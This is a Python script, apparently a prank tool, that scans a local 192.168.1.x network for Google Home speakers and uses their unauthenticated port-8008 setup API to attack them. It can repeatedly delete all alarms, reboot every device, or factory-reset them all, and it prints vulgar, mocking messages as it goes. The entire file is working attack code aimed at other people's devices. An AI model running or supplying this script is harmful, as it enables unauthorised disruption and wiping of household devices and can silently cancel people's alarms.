import requests
import time
import json
import datetime
import os
from progress.bar import Bar

gHomes = []
interval = 10

os.system('cls')
print('Scanning your network for Google Homes!\n')

bar = Bar('Processing', max=253)
for i in range(255):
    if (i < 2):
        None
    else:
        try:
            find = requests.get('http://192.168.1.{}:8008/setup/eureka_info'.format(i), timeout=.5)
            if find.status_code == 200:
                gHomes.append(i)
        except:
            None
        bar.next()
bar.finish()

input('\nFound {} Google Homes!\nPress ENTER to go to the Main Menu...'.format(len(gHomes)))

def albola ():

    os.system('cls')
    
    while True:
        for ipAddress in gHomes:
            info = json.loads(requests.get('http://192.168.1.{}:8008/setup/assistant/alarms'.format(ipAddress)).text)
            alarms = len(info['alarm'])

            if alarms != 0:
                print('----------------------------------------------------------------')
                print('[{}] {} alarm(s) detected!'.format(datetime.datetime.now().strftime('%X'), alarms))
                for i in info['alarm']:
                    alarmID = i['id']
                    requests.post('http://192.168.1.{}:8008/setup/assistant/alarms/delete'.format(ipAddress), json={'ids': [alarmID]})
                    print('[{}] Destroyed alarm: {}'.format(datetime.datetime.now().strftime('%X'), alarmID.replace('alarm/', '')))
                print('----------------------------------------------------------------')
            else:
                print('[{}] No alarms detected.'.format(datetime.datetime.now().strftime('%X')))
        
        time.sleep(interval)

def reboot ():
    os.system('cls')
    for ipAddress in gHomes:
        requests.post('http://192.168.1.{}:8008/setup/reboot'.format(ipAddress), json={"params": "now"})
        print('[{}] BOOM! You just got dat rebooterino son!'.format(datetime.datetime.now().strftime('%X')))
    time.sleep(2)
    input('\n[{}] Press ENTER to go back to the main menu...'.format(datetime.datetime.now().strftime('%X')))
    mainMenu()

def factoryReset ():
    os.system('cls')
    for ipAddress in gHomes:
        requests.post('http://192.168.1.{}:8008/setup/reboot'.format(ipAddress), json={"params": "fdr"})
        print('[{}] Deadass B? You just factory reset that bitch!'.format(datetime.datetime.now().strftime('%X')))
    time.sleep(2)
    input('\n[{}] Press ENTER to go back to the main menu...'.format(datetime.datetime.now().strftime('%X')))
    mainMenu()

def mainMenu ():
    os.system('cls')
    print('-----------------------')
    print('| Welcome to El Goog! |')
    print('-----------------------\n')
    choice = input('[1] Anti-Alarms\n[2] Rebooter\n[3] Factory Reseter\n\n> ')
    if choice == '1':
        albola()
    if choice == '2':
        reboot()
    if choice == '3':
        factoryReset()
    else:
        mainMenu()

mainMenu()
